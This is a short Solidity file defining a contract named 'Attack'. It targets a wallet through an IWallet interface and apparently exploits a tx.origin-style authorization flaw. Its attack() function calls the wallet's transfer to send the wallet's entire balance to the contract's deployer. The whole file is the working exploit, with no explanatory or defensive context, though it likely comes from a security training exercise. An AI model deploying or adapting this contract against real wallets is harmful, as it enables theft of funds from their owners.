// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

interface IWallet {
    function deposit() external payable;

    function transfer(address payable _to, uint _amount) external;
}

contract Attack {
    IWallet public wallet;
    address payable public owner;

    constructor(address _wallet) {
        wallet = IWallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
